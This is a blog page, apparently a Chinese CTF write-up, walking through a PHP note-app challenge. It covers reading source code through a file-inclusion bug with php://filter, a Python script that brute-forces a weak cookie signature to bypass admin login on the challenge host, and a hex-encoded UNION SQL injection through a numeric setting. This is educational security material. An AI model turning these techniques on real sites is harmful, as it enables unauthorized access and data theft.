@@ -1,0 +1,470 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    <meta name="author" content="ruozhi">
+    
+    <meta name="description" content="Nothing...">
+    
+    
+    
+    
+    
+    
+    <title>蓝鲸笔记管理系统（塔主nb） | ruozhi</title>
+    <link href=”https://liey1.github.io“ rel=”prefetch” />
+
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+<link rel="stylesheet" href="/css/aos.css">
+<link rel="stylesheet" href="/css/style.css">
+    <script src="/js/jquery.min.js"></script>
+    <script src="/js/bootstrap.min.js"></script>
+    <script src="/js/aos.js"></script>
+    <script src="/js/highslide/highslide-full.min.js"></script>
+    <link rel="stylesheet" href="/js/highslide/highslide.css">
+    <style type="text/css">
+        @media (max-width: 768px) {
+            body {
+                background-color: #f0f0f0;
+                background: url('/imgs/xsbg.gif');
+                background-attachment: fixed;
+            }
+        }
+    </style>
+    
+    <!--<script type="text/javascript">
+      if (document.images) {
+        var avatar = new Image();
+        avatar.src = '/imgs/avatar.jpg'
+        var previews = 'preview1.jpg,preview2.jpg,preview3.jpg,preview4.jpg,preview5.jpg'.split(',')
+        var previewsPreLoad = []
+        for(var i = 0; i < length; i++) {
+          previewsPreLoad.push(new Image())
+          previewsPreLoad[previewsPreLoad.length - 1].src = '/imgs/preview' + previews[i]
+        }
+      }
+    </script>-->
+</head>
+<body>
+    <!-- 背景轮播图功能 -->
+    <section class="hidden-xs">
+    <ul class="cb-slideshow">
+        <li><span>天若</span></li>
+        <li><span>有情</span></li>
+        <li><span>天亦老</span></li>
+        <li><span>我为</span></li>
+        <li><span>长者</span></li>
+        <li><span>续一秒</span></li>
+    </ul>
+</section>
+    <!-- 欧尼酱功能, 谁用谁知道 -->
+    
+    <div class="gal-menu gal-dropdown">
+    <div class="circle" id="gal">
+        <div class="ring">
+            <a href="https://liey1.github.io" class="menuItem" style="left: 50%; top: 15%;">首页</a>
+            
+            <a class="menuItem" style="left: 80.3109%; top: 32.5%;">下一页</a>
+            
+            <a href="/archives" class="menuItem" style="left: 80.3109%; top: 67.5%;">归档</a>
+            <a href="/plan" class="menuItem" style="left: 50%; top: 85%;">计划</a>
+            <a href="/essays" class="menuItem" style="left: 19.6891%; top: 67.5%;">随笔</a>
+            
+            <a class="menuItem" style="left: 19.6891%; top: 32.5%;">上一页</a>
+            
+        </div>
+        <audio id="audio" src="/imgs/oni.mp3"></audio>
+    </div>
+</div>
+    
+    <header class="navbar navbar-inverse" id="gal-header">
+    <div class="container">
+        <div class="navbar-header">
+            <button type="button" class="navbar-toggle collapsed"
+                    data-toggle="collapse" data-target=".bs-navbar-collapse"
+                    aria-expanded="false">
+                <span class="fa fa-lg fa-reorder"></span>
+            </button>
+            <a href="https://liey1.github.io">
+                
+                <style>
+                    #gal-header .navbar-brand {
+                        height: 54px;
+                        line-height: 24px;
+                        font-size: 28px;
+                        opacity: 1;
+                        background-color: rgba(0,0,0,0);
+                        text-shadow: 0 0 5px #fff,0 0 10px #fff,0 0 15px #fff,0 0 20px #228DFF,0 0 35px #228DFF,0 0 40px #228DFF,0 0 50px #228DFF,0 0 75px #228DFF;
+                    }
+                </style>
+                <!-- 这里使用文字(navbar_text or config.title) -->
+                <div class="navbar-brand">ruozhi</div>
+                
+            </a>
+        </div>
+        <div class="collapse navbar-collapse bs-navbar-collapse">
+            <ul class="nav navbar-nav" id="menu-gal">
+                
+                
+                <li class="">
+                    <a href="/">
+                        <i class="fa fa-home"></i>首页
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/archives">
+                        <i class="fa fa-archive"></i>归档
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/collections">
+                        <i class="fa fa-list"></i>收藏
+                    </a>
+                </li>
+                
+                
+                
+                <li class="">
+                    <a href="/about">
+                        <i class="fa fa-user"></i>关于我
+                    </a>
+                </li>
+                
+                
+            </ul>
+        </div>
+    </div>
+</header>
+    <div id="gal-body">
+        <div class="container">
+            <div class="row">
+                <div class="col-md-8 gal-right" id="mainstay">
+                    
+<article class="article well article-body" id="article">
+    <div class="breadcrumb">
+        <i class="fa fa-home"></i>
+        <a href="https://liey1.github.io">ruozhi</a>
+        >
+        <span>蓝鲸笔记管理系统（塔主nb）</span>
+    </div>
+    <!-- 大型设备详细文章 -->
+    <div class="hidden-xs">
+        <div class="title-article">
+            <h1>
+                <a href="/2018/09/09/蓝鲸笔记管理系统/">蓝鲸笔记管理系统（塔主nb）</a>
+            </h1>
+        </div>
+        <div class="tag-article">
+            
+            <span class="label label-gal">
+                <i class="fa fa-calendar"></i> 2018-09-09
+            </span>
+            
+        </div>
+    </div>
+    <!-- 小型设备详细文章 -->
+    <div class="visible-xs">
+        <center>
+            <div class="title-article">
+                <h4>
+                    <a href="/2018/09/09/蓝鲸笔记管理系统/">蓝鲸笔记管理系统（塔主nb）</a>
+                </h4>
+            </div>
+            <p>
+                <i class="fa fa-calendar"></i> 2018-09-09
+            </p>
+            <p>
+                
+                
+            </p>
+        </center>
+    </div>
+    <div class="content-article">
+        <h4 id="蓝鲸官网"><a href="#蓝鲸官网" class="headerlink" title="蓝鲸官网"></a><a href="http://www.whaledu.com/" target="_blank" rel="noopener">蓝鲸官网</a></h4><h4 id="本题源码"><a href="#本题源码" class="headerlink" title="本题源码"></a><a href="http://bmob-cdn-21455.b0.upaiyun.com/2018/09/09/7490aba640f5756380392e7b8b4f97c6.zip" target="_blank" rel="noopener">本题源码</a></h4><hr>
+<p>首先先随便注册个，登陆看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/cc52eff0409f44bf80c7adaf12ea54fe.png" alt="前台"></p>
+<p>这里看到个提示一样的东西：访问 <code>/dbinit.sql</code> 拿到 数据库结构。</p>
+<p>再看看地址，首页的 url 地址为：<br><code>http://106.39.10.134:10002/index.php?action=front&amp;mode=index</code></p>
+<p>一开始还以为是 MVC 架构的，后来看了师傅的 WP 发现：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$action=$_GET[<span class="string">'action'</span>];</span><br><span class="line">$mode=$_GET[<span class="string">'mode'</span>];</span><br><span class="line">$file=$action.<span class="string">'/'</span>.$mode.<span class="string">'.php'</span>;</span><br><span class="line"><span class="keyword">include</span>($file);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<p>很明显的一个文件包含漏洞。用 <code>php://filter</code> 伪协议读取源码：</p>
+<p><code>/index.php?action=php://filter/read=convert.base64-encode/resource=front/&amp;mode=index</code></p>
+<p>但是这里读不出 <code>config.inc.php</code> 原因可以在 <code>index.php</code> 中看到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">else if(!preg_match(&apos;/\.&#123;2&#125;/is&apos;,$_GET[&apos;action&apos;])&amp;&amp;preg_match(&apos;/^[0-9A-Za-z]+$/is&apos;,$_GET[&apos;mode&apos;])</span><br></pre></td></tr></table></figure>
+<p>mode 中不能包含 <code>.</code></p>
+<hr>
+<p>共读取到：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">index.php</span><br><span class="line">common.php</span><br><span class="line">admin/index.php</span><br><span class="line">admin/login.php</span><br><span class="line">admin/setpagenum.php</span><br><span class="line">front/index.php</span><br><span class="line">front/login.php</span><br><span class="line">front/newnote.php</span><br><span class="line">front/register.php</span><br></pre></td></tr></table></figure></p>
+<p>我们可以看看 <code>admin/index.php</code> 中是怎么验证是否登陆的（别问为什么一上来就看这个）：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p>
+<p>调用了 <code>check_login</code> 和 <code>get_level</code> 函数，这两个函数在 <code>common.php</code> 中。我们先看看这个文件的开头：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/954b0b56403c004580c6b260c9279692.png" alt="公共文件开头"></p>
+<p>很明显，这里进行了一些初始化操作。</p>
+<p>再来看看两个验证函数：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/9dca48914066fb13807322ce25d465ab.png" alt="公共文件"></p>
+<p>这里将 <code>cookie</code> 中的 <code>uid</code> 取出，以 <code>|</code>  分割，加密判断。</p>
+<p>如果成功返回当前 <code>$_SESSION</code> 中的值，否则返回 <code>False</code>。如果没登陆，那此时的值为 <code>NULL</code> ，但是判断使用的是 <code>严格</code> 判断，即：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(check_login()!==<span class="keyword">false</span>&amp;&amp;get_level()!==<span class="keyword">false</span>)</span><br></pre></td></tr></table></figure>
+<p>这两个函数的绕过方法是一样的，所以下一步我们的目标就是研究：</p>
+<p><code>$userinfo[1]==encode($userinfo[0])</code></p>
+<p>这个条件怎么成立，这个数组是我们可控的，我们可以跟进 <code>encode</code> 函数中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">encode</span><span class="params">($str)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> md5($_SESSION[<span class="string">'SECURITY_KEY'</span>].$str);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>不难理解，翻上面发现：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$_SESSION[&apos;SECURITY_KEY&apos;]=rand_str(6);</span><br></pre></td></tr></table></figure>
+<p>来看看这个函数的实现：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">rand_str</span><span class="params">($lenth=<span class="number">16</span>)</span></span>&#123;</span><br><span class="line">   $rand=[];</span><br><span class="line">   $_str=<span class="string">"wh"</span>;</span><br><span class="line">   <span class="keyword">while</span>($lenth)&#123;</span><br><span class="line">   $rand[]=$_str[rand(<span class="number">0</span>,strlen($_str)<span class="number">-1</span>)];</span><br><span class="line">   $lenth--;</span><br><span class="line">   &#125;</span><br><span class="line"><span class="comment">//    var_dump($rand);</span></span><br><span class="line"></span><br><span class="line">   <span class="keyword">return</span> implode($rand);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p> 随机取6位 <code>w</code> 或 <code>h</code> </p>
+<hr>
+<p> 整理一下思路：</p>
+<p> 要想绕过登陆验证，就要让验证函数返回 <code>NULL</code>。</p>
+<p> 函数返回 <code>NULL</code> 的条件为：</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if($userinfo[1]==encode($userinfo[0]))</span><br></pre></td></tr></table></figure>
+<p> $userinfo 是我们可以控制的，唯一不确定的是 encode 函数中用到的 <code>$_SESSION[&#39;SECURITY_KEY&#39;]</code></p>
+<p> 因为不对，所以我们写个脚本爆破：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import itertools</span><br><span class="line">from hashlib import md5</span><br><span class="line"></span><br><span class="line">lst = itertools.product(&quot;wh&quot;, repeat=6)</span><br><span class="line">url = &quot;http://106.39.10.134:10002/index.php?action=admin&amp;mode=index&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def m(s):</span><br><span class="line">    return md5(s).hexdigest()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">for i in lst:</span><br><span class="line">    key = m(&apos;&apos;.join(i) + &apos;admin&apos;)</span><br><span class="line">    headers = &#123;</span><br><span class="line">        &quot;Cookie&quot;: &quot;PHPSESSID=05ibpb1gtgmuq4ji4g5cgkvg07;uid=admin|&quot; + key</span><br><span class="line">    &#125;</span><br><span class="line">    r = requests.get(url, headers=headers)</span><br><span class="line">    if r.text.find(&quot;not login&quot;) &lt; 0:</span><br><span class="line">        print(headers)</span><br></pre></td></tr></table></figure>
+<p>很快就会输出 <code>Cookie</code>，添加上浏览器，再访问 后台的 <code>index</code> 即可。。</p>
+<blockquote>
+<p>踩坑</p>
+</blockquote>
+<p>这里还有个坑，就是如果你当前的 SESSION 已经登陆过前台，那么爆破就会失败。原因可能是 <code>$_SESSION</code> 中登陆的用户的 <code>level</code> 为 0，在 <code>get_level</code> 函数中会返回 <code>False</code></p>
+<hr>
+<p>现在我们已经登陆了后台，看看后台的代码：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/d604a118405d4ac080cad091a15370c2.png" alt="后台首页"></p>
+<p>这里拼接了个 <code>get_page_size()</code>，这个函数在 <code>common.php</code> 里，我们看看这个函数：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function get_page_size()&#123;</span><br><span class="line">      $sql=&quot;select num from page&quot;;</span><br><span class="line">      $res=mysql_my_query($sql);</span><br><span class="line">      $row=$res-&gt;fetch_assoc();</span><br><span class="line">      return $row[&apos;num&apos;];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>只做了很简单的查询。</p>
+<p>我们会发现后台页面还有个设置页面（<code>setpagenum.php</code>），进去看看：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/16bfd11e40309e538040b0c702fd600b.png" alt="后台设置页面"></p>
+<p>这个设置就是 <code>get_page_size</code> 查询并返回的表和字段，猜测关键点可能就在这了（别问为什么猜）。</p>
+<p>可以看到，这里做了 <code>is_numeric</code> 的判断，判断是否是数字。</p>
+<p>mysql 中允许这么玩：<br><code>select 0x313233;</code></p>
+<p>这条语句会输出 <code>123</code>，也就是 ASCII 码。</p>
+<p>但是不允许这么玩：</p>
+<p><code>select &#39;0x313233&#39;;</code></p>
+<p>注意这里加了单引号，此时输出 <code>0x313133</code></p>
+<p>我们发现这里是没有加引号的，所以我们传进来的值会在执行时解析成 ASCII 码。如果这是故意留的洞，那该字段的属性就不会是 <code>int</code>。因为 <code>int</code> 就不能存储字符串了。</p>
+<hr>
+<p>回顾一下查询语句：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$page_size=get_page_size();</span><br><span class="line">$sql=&quot;select * from note  limit 0,&quot;.$page_size;</span><br></pre></td></tr></table></figure>
+<p>思考能不能用这样的语句：select * from note  limit 0,1 union select 2 </p>
+<p>（！！！ 5.7 以后 limit 必须要放在最后，5.7以前是可以的）</p>
+<p>5.7 以后会报：<code>ERROR 1221 (HY000): Incorrect usage of UNION and LIMIT</code></p>
+<blockquote>
+<p>利用</p>
+</blockquote>
+<p>那么现在就可以利用了：</p>
+<p>在 <code>mysql</code> 里运行：</p>
+<p><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/997ec5b94098030380caea6f2dd04cc9.png" alt="mysql"></p>
+<p>这样我们就可以很方便的获得 <code>16进制</code> 了（只要转成 ASCII 就可以了）。</p>
+<p>加上 <code>0x</code> 填上去提交：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/5fca457a40b2c53b8013764d28921f51.png" alt="填"></p>
+<p>到前台：<br><img src="http://bmob-cdn-21452.b0.upaiyun.com/2018/09/09/f23e901240efe71180c386fb77034312.png" alt="后台首页"></p>
+<p>可以看到 3  和 2 被显示出来了。。看回一开始拿到的数据库结构，发现有个<code>flags</code> 表和 <code>flag</code> 字段，构造一下就可以出来了。。</p>
+<h3 id="突然的结束，是因为懒"><a href="#突然的结束，是因为懒" class="headerlink" title="突然的结束，是因为懒"></a>突然的结束，是因为懒</h3>
+    </div>
+</article>
+
+
+                </div>
+                <aside class="col-md-4 gal-left" id="sidebar">
+    <!-- 此为sidebar的搜索框, 非搜索结果页面 -->
+<aside id="sidebar-search">
+    <div class="search hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <form class="form-inline clearfix" id="search-form" method="get"
+              action="/search/index.html">
+            <input type="text" name="s" class="form-control" id="searchInput" placeholder="搜索文章~">
+            <button class="btn btn-danger btn-gal" type="submit">
+                <i class="fa fa-search"></i>
+            </button>
+        </form>
+    </div>
+</aside>
+    <aside id="sidebar-author">
+    <div class="panel panel-gal" data-aos="flip-right" data-aos-duration="3000">
+        <div class="panel-heading" style="text-align: center">
+            <i class="fa fa-quote-left"></i>
+            ruozhi
+            <i class="fa fa-quote-right"></i>
+        </div>
+        <div class="author-panel text-center">
+            <img src="/imgs/avatar.jpg" width="140" height="140"
+                 alt="个人头像" class="author-image">
+            <p class="author-description"><p>Nothing…</p>
+</p>
+        </div>
+    </div>
+</aside>
+    
+    <!-- 要配置好leancloud才能开启此小工具 -->
+    
+    
+    <aside id="sidebar-recent_posts">
+    <div class="panel panel-gal recent hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+        <div class="panel-heading">
+            <i class="fa fa-refresh"></i>
+            近期文章
+            <i class="fa fa-times-circle panel-remove"></i>
+            <i class="fa fa-chevron-circle-up panel-toggle"></i>
+        </div>
+        <ul class="list-group list-group-flush">
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/11/一道简单的 PWN 题/">一道简单的 PWN 题</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/09/蓝鲸笔记管理系统/">蓝鲸笔记管理系统（塔主nb）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/09/蓝鲸文件管理系统/">蓝鲸文件管理系统（塔主nb）</a>
+                </span>
+            </li>
+            
+            <li class="list-group-item">
+                <span class="post-title">
+                    <a href="/2018/09/09/hello-world/">Nothing。。。</a>
+                </span>
+            </li>
+            
+        </ul>
+    </div>
+</aside>
+    
+    
+    
+    <aside id="gal-sets">
+        <div class="panel panel-gal hidden-xs" data-aos="fade-up" data-aos-duration="2000">
+            <ul class="nav nav-pills pills-gal">
+                
+                <li class="">
+                    <a href="/2018/09/09/蓝鲸笔记管理系统/index.html#sidebar-friend-links" data-toggle="tab" id="friend-links-tab">我大哥的Blog</a>
+                </li>
+                <li class="">
+                    <a href="/2018/09/09/蓝鲸笔记管理系统/index.html#sidebar-links" data-toggle="tab" id="links-tab">个人链接</a>
+                </li>
+            </ul>
+            <div class="tab-content">
+                <div class="friend-links tab-pane nav bs-sidenav fade" id="sidebar-friend-links">
+    
+    <li>
+        <a href="https://hl0rey.github.io" target="_blank">hl0rey</a>
+    </li>
+    
+    <li>
+        <a href="https://yuyue123am.github.io/" target="_blank">小铭同学</a>
+    </li>
+    
+    <li>
+        <a href="http://www.mzxh.xyz/" target="_blank">墨竹星海</a>
+    </li>
+    
+    <li>
+        <a href="https://zzzzxycc.github.io/" target="_blank">zzzzxycc</a>
+    </li>
+    
+    <li>
+        <a href="https://damit5.com" target="_blank">damit5</a>
+    </li>
+    
+    <li>
+        <a href="http://blog.yanqin.net.cn/" target="_blank">燕青</a>
+    </li>
+    
+</div>
+                <div class="links tab-pane nav bs-sidenav fade" id="sidebar-links">
+    
+    <li>
+        <a href="https://www.baidu.com" target="_blank">百度</a>
+    </li>
+    
+    <li>
+        <a href="https://github.com" target="_blank">github</a>
+    </li>
+    
+    <li>
+        <a href="https://www.zhihu.com" target="_blank">知乎</a>
+    </li>
+    
+</div>
+            </div>
+        </div>
+    </aside>
+    
+</aside>
+            </div>
+        </div>
+    </div>
+    <footer id="gal-footer">
+    <div class="container">
+        Copyright © 2018 ruozhi Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>.&nbsp;Theme by <a href="https://github.com/ZEROKISEKI" target="_blank">AONOSORA</a>
+    </div>
+</footer>
+
+<!-- 回到顶端 -->
+<div id="gal-gotop">
+    <i class="fa fa-angle-up"></i>
+</div>
+</body>
+<script src="/js/activate-power-mode.js"></script>
+<script>
+
+    // 配置highslide
+	hs.graphicsDir = '/js/highslide/graphics/'
+    hs.outlineType = "rounded-white";
+    hs.dimmingOpacity = 0.8;
+    hs.outlineWhileAnimating = true;
+    hs.showCredits = false;
+    hs.captionEval = "this.thumb.alt";
+    hs.numberPosition = "caption";
+    hs.align = "center";
+    hs.transitions = ["expand", "crossfade"];
+    hs.lang.number = '共%2张图, 当前是第%1张';
+    hs.addSlideshow({
+      interval: 5000,
+      repeat: true,
+      useControls: true,
+      fixedControls: "fit",
+      overlayOptions: {
+        opacity: 0.75,
+        position: "bottom center",
+        hideOnMouseOut: true
+      }
+    })
+
+    // 初始化aos
+    AOS.init({
+      duration: 1000,
+      delay: 0,
+      easing: 'ease-out-back'
+    });
+
+</script>
+<script>
+	POWERMODE.colorful = 'true';    // make power mode colorful
+	POWERMODE.shake = 'true';       // turn off shake
+	// TODO 这里根据具体情况修改
+	document.body.addEventListener('input', POWERMODE);
+</script>
+<script>
+    window.slideConfig = {
+      prefix: '/imgs/slide/background',
+      ext: 'jpg',
+      maxCount: '6'
+    }
+</script>
+<script src="/js/hs.js"></script>
+<script src="/js/blog.js"></script>
+
+<script src="/js/oni.js"></script>
+
+
+
+</html>
